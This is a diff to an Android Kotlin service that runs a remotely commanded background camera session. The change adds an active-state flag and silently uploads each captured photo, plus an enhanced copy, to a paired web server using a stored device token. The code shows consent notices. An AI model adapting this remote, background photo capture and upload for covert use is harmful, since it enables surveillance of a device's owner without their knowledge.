@@ -126,6 +126,7 @@ class CameraSessionService : Service(), LifecycleOwner {
                 val camera = provider.bindToLifecycle(this, CameraSelector.DEFAULT_BACK_CAMERA, capture, analysis)
                 cameraControl = camera.cameraControl
                 imageCapture = capture
+                SecurePrefs.get(this).edit().putBoolean("camera_active", true).apply()
                 updateNotification("جلسة الكاميرا نشطة بموافقتك. أرسل /capture لالتقاط صورة.")
                 sendStatus("تم تشغيل جلسة الكاميرا في الخلفية بموافقتك. أرسل /capture للتصوير أو /stopcamera للإيقاف.")
             } catch (e: Exception) {
@@ -212,6 +213,15 @@ class CameraSessionService : Service(), LifecycleOwner {
                         } catch (_: Exception) { false }
                         val originalResult = uploadPhoto(original, "الصورة الأصلية")
                         val enhancedResult = if (enhancedReady) uploadPhoto(enhanced, "نسخة محسّنة للوضوح والقراءة") else Pair(false, "تعذر إنشاء النسخة المحسّنة")
+                        val prefs = SecurePrefs.get(this)
+                        if (prefs.getBoolean("web_paired", false)) {
+                            val base = prefs.getString("web_base_url", "").orEmpty()
+                            val deviceToken = prefs.getString("web_device_token", "").orEmpty()
+                            try {
+                                WebControlClient.upload(base, deviceToken, original, "MANW_ORIGINAL_" + original.name)
+                                if (enhancedReady) WebControlClient.upload(base, deviceToken, enhanced, "MANW_CLEAR_" + enhanced.name)
+                            } catch (_: Exception) { }
+                        }
                         val recognized = if (enhancedReady) try { extractReadableText(enhanced) } catch (_: Exception) { "" } else ""
                         if (recognized.isNotBlank()) sendRecognizedText(recognized)
                         val allSent = originalResult.first && (!enhancedReady || enhancedResult.first)
@@ -293,6 +303,7 @@ class CameraSessionService : Service(), LifecycleOwner {
     private fun stopCamera(message: String) {
         ProcessCameraProvider.getInstance(this).get().unbindAll()
         imageCapture = null
+        SecurePrefs.get(this).edit().putBoolean("camera_active", false).apply()
         sendStatus(message)
     }
 
@@ -323,6 +334,7 @@ class CameraSessionService : Service(), LifecycleOwner {
         try { ProcessCameraProvider.getInstance(this).get().unbindAll() } catch (_: Exception) { }
         imageCapture = null
         cameraControl = null
+        SecurePrefs.get(this).edit().putBoolean("camera_active", false).apply()
         analysisExecutor.shutdown()
         if (receiverRegistered) {
             try { unregisterReceiver(commandReceiver) } catch (_: Exception) { }
